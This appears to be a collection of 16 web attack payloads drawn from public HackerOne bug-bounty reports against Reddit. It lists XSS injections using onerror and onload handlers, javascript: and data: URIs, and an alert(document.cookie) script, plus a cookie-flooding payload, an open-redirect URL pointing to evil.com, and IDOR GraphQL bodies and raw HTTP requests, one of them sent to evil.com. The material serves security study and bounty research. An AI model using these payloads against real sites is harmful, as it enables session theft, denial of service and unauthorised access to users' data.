# Reddit

16 payloads.

### `86afb137`

```
<html>
 <img src=x onerror="document.cookie='x1='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.target.com'">
<img src=x onerror="document.cookie='x2='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.target.com'">
<img src=x onerror="document.cookie='x3='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.target.com'">
<img src=x onerror="document.cookie='x4='+Array(3900).join(0)+';Expires=Wed, 02 Apr 
```

— [XSS in target.com can compromise data of evil.com](https://hackerone.com/reports/862882) · Reddit · [keer0k](https://hackerone.com/keer0k)

### `27f35a50`

```
<html> <img src = x onerror = alert (1)> </html>
```

— [XSS in target.com can compromise data of evil.com](https://hackerone.com/reports/862882) · Reddit · [keer0k](https://hackerone.com/keer0k)

### `441e4dfd`

```
<a href="javascript:alert(2)">test 1</a>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0

### `5b980b57`

```
<a xlink:href="javascript:alert(2)">test 2</a>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0

### `31919e62`

```
<a href="data:data:image/svg+xml,%3Csvg xmlns='                          ' onload='alert(88)'%3E%3C/svg%3E">test 5</a>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0

### `aea71dc9`

```
<a xlink:href="data:image/svg+xml,%3Csvg xmlns='                          ' onload='alert(88)'%3E%3C/svg%3E">test 6</a>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0

### `5c132eb1`

```
<line onload="alert(2)" fill="none" stroke="#000000" stroke-miterlimit="10" x1="119" y1="84.5" x2="454" y2="84.5"/>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0

### `f5a3d51d`

```
<script>alert(document.cookie);</script>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0

### `9b96f20b`

```
https://target.com/redirect.php?url=http://evil.com.
```

**Parameter:** `url`
— [Vulnerability Name: URL Redirection / Unvalidate Open Redirect](https://hackerone.com/reports/1182824) · Reddit · [hasnain_123](https://hackerone.com/hasnain_123)

### `f2bab7b0`

```
{"variables":{"platformUserId":"PLATFORM_USER_ID","offerId":"UUID_OFFER_ID"},"id":"475c91dd4480"}
```

**Parameter:** `variables`
— [Reddit talk promotion offers don't expire, allowing users to accept them after being demoted](https://hackerone.com/reports/1656380) · Reddit · [ahacker1](https://hackerone.com/ahacker1)

### `da53a062`

```
{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit",
"after":"code-from-endCursor"
}}
```

**Parameter:** `after`
— [Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability](https://hackerone.com/reports/1658418) · Reddit · [high_ping_ninja](https://hackerone.com/high_ping_ninja) · $5,000.0

### `11e14edf`

```
POST / HTTP/2
Host: target.com
Content-Length: 62
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
X-Reddit
```

**Parameter:** `username`
— [IDOR allows an attacker to modify the links of any user](https://hackerone.com/reports/1661113) · Reddit · [criptex](https://hackerone.com/criptex)

### `1378d56b`

```
POST / HTTP/2
Host: evil.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 173
X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Compression: 1
Origin: https://target.com
Sec-Fetch
```

— [IDOR allows an attacker to modify the links of any user](https://hackerone.com/reports/1661113) · Reddit · [criptex](https://hackerone.com/criptex)

### `22a27ec2`

```
<option><style></option></select><img src=x onerror=alert(1)></style>
```

— [CVE-2020-11022](https://hackerone.com/reports/1812768) · Reddit · [greymanx1](https://hackerone.com/greymanx1)

### `dcc52215`

```
https://target.com/?dest=javascript:alert(document.domain)
```

**Parameter:** `dest`
— [\[target.com\] Redirect parameter allows for XSS](https://hackerone.com/reports/1962645) · Reddit · [dvorakxl](https://hackerone.com/dvorakxl) · $5,000.0

### `e1cad3cf`

```
https://target.com/login/?dest=javascript:alert(document.domain
```

**Parameter:** `dest`
— [Regression on dest parameter sanitization doesn't check scheme/websafe destinations](https://hackerone.com/reports/1962951) · Reddit · [mrzheev](https://hackerone.com/mrzheev) · $500.0
